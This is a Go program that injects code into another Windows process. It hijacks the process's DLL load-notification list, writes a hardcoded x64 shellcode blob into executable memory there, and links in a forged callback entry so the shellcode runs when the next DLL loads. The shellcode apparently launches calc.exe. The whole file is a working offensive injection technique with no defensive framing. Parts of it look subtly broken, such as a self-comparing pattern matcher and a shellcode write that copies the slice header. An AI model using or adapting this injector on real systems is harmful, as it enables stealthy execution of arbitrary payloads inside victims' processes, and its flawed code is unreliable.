package main

import (
	"fmt"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

type LDR_DLL_NOTIFICATION_FUNCTION func(NotificationReason uint32, NotificationData uintptr, Context uintptr)

type LDR_DLL_NOTIFICATION_ENTRY struct {
	List     windows.LIST_ENTRY
	CallBack *LDR_DLL_NOTIFICATION_FUNCTION
	Context  uintptr
}

func DummyCallBack(NotificationReason uint32, NotificationData uintptr, Context uintptr) uintptr {
	return 0
}

func GetDllNotificationListHead() *windows.LIST_ENTRY {
	var head *windows.LIST_ENTRY

	var hNtdll = windows.NewLazyDLL("ntdll.dll")
	if hNtdll != nil {
		// find LdrRegisterDllNotification function
		var pLdrRegisterDllNotification = hNtdll.NewProc("LdrRegisterDllNotification")

		// find LdrUnregisterDllNotification function
		var pLdrUnregisterDllNotification = hNtdll.NewProc("LdrUnregisterDllNotification")

		var cookie uintptr

		status, _, _ := pLdrRegisterDllNotification.Call(uintptr(0), syscall.NewCallback(DummyCallBack), 0, uintptr(unsafe.Pointer(&cookie)))
		if status == 0 {
			fmt.Println("[+] Callback registred successfully")
			head = (*LDR_DLL_NOTIFICATION_ENTRY)(unsafe.Pointer(cookie)).List.Flink
			fmt.Printf("[+] Found LdrpDllNotificationListHead : %p\n", head)

			status, _, _ = pLdrUnregisterDllNotification.Call(cookie)

			if status == 0 {
				fmt.Println("[+] Callback unregistred successfully")
			}
		}
	}
	return head
}

func PrintDllNotificationList(hProc windows.Handle, remoteHeadAddress uintptr) {
	fmt.Printf("\n")
	fmt.Printf("[+] Remote DLL Notification Block List: \n")

	entry := make([]byte, unsafe.Sizeof(LDR_DLL_NOTIFICATION_ENTRY{}))

	windows.ReadProcessMemory(hProc, remoteHeadAddress, (*byte)(unsafe.Pointer(&entry[0])), unsafe.Sizeof(LDR_DLL_NOTIFICATION_ENTRY{}), nil)
	currentEntryAddress := remoteHeadAddress

	for {
		fmt.Printf("%#x ->  %#x\n", currentEntryAddress, (*LDR_DLL_NOTIFICATION_ENTRY)(unsafe.Pointer(&entry[0])).CallBack)

		currentEntryAddress = uintptr(unsafe.Pointer((*LDR_DLL_NOTIFICATION_ENTRY)(unsafe.Pointer(&entry[0])).List.Flink))

		windows.ReadProcessMemory(hProc, currentEntryAddress, (*byte)(unsafe.Pointer(&entry[0])), unsafe.Sizeof(LDR_DLL_NOTIFICATION_ENTRY{}), nil)

		if currentEntryAddress == remoteHeadAddress {
			break
		}
	}
	fmt.Printf("\n")
}

func FindProcessID(procname string) uint32 {
	hSnap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0
	}
	defer windows.CloseHandle(hSnap)

	var pe32 windows.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	if err := windows.Process32First(hSnap, &pe32); err != nil {
		return 0
	}

	for {
		if strings.EqualFold(procname, windows.UTF16ToString(pe32.ExeFile[:])) {
			return pe32.ProcessID
		}
		if err := windows.Process32Next(hSnap, &pe32); err != nil {
			break
		}
	}

	return 0
}

func MaskCompare(pData, bMask []byte, szMask string) bool {
	for i := 0; i < len(szMask); i++ {
		if szMask[i] == 'x' && pData[i] != bMask[i] {
			return false
		}
	}
	return true
}

func FindPattern(dwAddress uintptr, dwLen uint32, bMask []byte, szMask string) uintptr {
	for i := uint32(0); i < dwLen; i++ {
		if MaskCompare(bMask, bMask, szMask) {
			return dwAddress + uintptr(i)
		}
	}
	return 0
}

func copyMemory(dest unsafe.Pointer, src unsafe.Pointer, size uintptr) {
	for i := uintptr(0); i < size; i++ {
		destByte := (*byte)(unsafe.Pointer(uintptr(dest) + i))
		srcByte := (*byte)(unsafe.Pointer(uintptr(src) + i))
		*destByte = *srcByte
	}
}

func main() {

	shellcode := []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x0, 0x0, 0x0, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0xf, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x2, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x1, 0xd0, 0x8b, 0x80, 0x88, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x1, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x1, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x1, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x3, 0x4c, 0x24, 0x8, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x1, 0xd0, 0x66, 0x41, 0x8b, 0xc, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x1, 0xd0, 0x41, 0x8b, 0x4, 0x88, 0x48, 0x1, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x8d, 0x1, 0x1, 0x0, 0x0, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0xa, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x6, 0x7c, 0xa, 0x80, 0xfb, 0xe0, 0x75, 0x5, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x0, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x0}

	const ALL_ACCESS = 2035711 // 0x001F0FFF
	localHeadAddress := uintptr(unsafe.Pointer(GetDllNotificationListHead()))
	fmt.Printf("[+] Local lDdrpDllNotificationListHead : %#x\n", localHeadAddress)

	hProc, _ := windows.OpenProcess(ALL_ACCESS, false, uint32(FindProcessID("dllHook.exe")))
	fmt.Printf("[+] got handle to remote process \n")

	PrintDllNotificationList(hProc, localHeadAddress)

	// Allocate memory in explorer.exe process for shellcode
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	//shellcodeEx, _, _ := VirtualAllocEx.Call(uintptr(hProc), 0, uintptr(len(shellcode))+uintptr(len(restore)), 0x00001000|0x00002000, 0x40)
	//fmt.Printf("[+] Allocated memory for shellcode in remote process: %#x\n", shellcodeEx)

	// Allocate memory for our trampoline + restore prologue + shellcode in the remote process

	shellcodeEx, _, _ := VirtualAllocEx.Call(uintptr(hProc), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	fmt.Printf("[+] Allocated memory for shellcode in remote process : %#x\n", shellcodeEx)

	// Offset the size of the trampoline and the restore prologue to get the shellcode address
	//shellcodeEx = restoreEx + uintptr(len(restore))


	//WriteProcessMemory.Call(uintptr(hProc), restoreExAddress, restoreEx, 8, 0)
	err := windows.WriteProcessMemory(hProc, shellcodeEx, (*byte)(unsafe.Pointer(&shellcode)), uintptr(len(shellcode)), nil)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Printf("[+] Shellcode has been written to remote process: %#x\n", shellcodeEx)
	

	var newEntry LDR_DLL_NOTIFICATION_ENTRY
	newEntry.Context = uintptr(0)
	newEntry.CallBack = (*LDR_DLL_NOTIFICATION_FUNCTION)(unsafe.Pointer(shellcodeEx))
	newEntry.List.Blink = (*windows.LIST_ENTRY)(unsafe.Pointer(localHeadAddress))

	remoteHeadEntry := make([]byte, unsafe.Sizeof(LDR_DLL_NOTIFICATION_ENTRY{}))

	err = windows.ReadProcessMemory(hProc, localHeadAddress, (*byte)(&remoteHeadEntry[0]), unsafe.Sizeof(LDR_DLL_NOTIFICATION_ENTRY{}), nil)
	if err != nil {
		fmt.Println(err)
	}

	newEntry.List.Flink = (*LDR_DLL_NOTIFICATION_ENTRY)(unsafe.Pointer(&remoteHeadEntry[0])).List.Flink

	// Allocate memory for new entry
	newEntryAddress, _, _ := VirtualAllocEx.Call(uintptr(hProc), 0, unsafe.Sizeof(LDR_DLL_NOTIFICATION_ENTRY{}), 0x00001000|0x00002000, 0x40)
	fmt.Printf("[+] Allocated memory for new entry in remote process : %#x\n", newEntryAddress)

	// write new entry to allocated memory
	//WriteProcessMemory.Call(uintptr(hProc), newEntryAddress, uintptr(unsafe.Pointer(&newEntry)), unsafe.Sizeof(LDR_DLL_NOTIFICATION_ENTRY{}), 0)
	err = windows.WriteProcessMemory(hProc, newEntryAddress, (*byte)(unsafe.Pointer(&newEntry)), unsafe.Sizeof(LDR_DLL_NOTIFICATION_ENTRY{}), nil)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Printf("[+] New entry has been written to remote process: %#x\n", newEntryAddress)

	previousEntryFlink := localHeadAddress + unsafe.Offsetof(LDR_DLL_NOTIFICATION_ENTRY{}.List) + unsafe.Offsetof(windows.LIST_ENTRY{}.Flink)
	nextEntryBlink := uintptr(unsafe.Pointer((*LDR_DLL_NOTIFICATION_ENTRY)(unsafe.Pointer(&remoteHeadEntry[0])).List.Flink)) + unsafe.Offsetof(LDR_DLL_NOTIFICATION_ENTRY{}.List) + unsafe.Offsetof(windows.LIST_ENTRY{}.Blink)

	fmt.Printf("%#x\n", previousEntryFlink)
	fmt.Printf("TMP -> %#x\n", uintptr(unsafe.Pointer((*LDR_DLL_NOTIFICATION_ENTRY)(unsafe.Pointer(&remoteHeadEntry[0])).List.Flink)))
	fmt.Printf("%#x\n", nextEntryBlink)

	// buffer for the original values we are goind to overwrite


	// Overwrite the previous entry's Flink (head) with the address of our new entry
	//WriteProcessMemory.Call(uintptr(hProc), previousEntryFlink, newEntryAddress, 8, 0)
	err = windows.WriteProcessMemory(hProc, previousEntryFlink, (*byte)(unsafe.Pointer(&newEntryAddress)), 8, nil)
	if err != nil {
		fmt.Println(err)
	}

	err = windows.WriteProcessMemory(hProc, nextEntryBlink, (*byte)(unsafe.Pointer(&newEntryAddress)), 8, nil)
	if err != nil {
		fmt.Println(err)
	}

	fmt.Printf("[+] LdrpDllNotificationList has been modified\n")
	fmt.Printf("[+] The new entry has been added")

	PrintDllNotificationList(hProc, localHeadAddress)
}
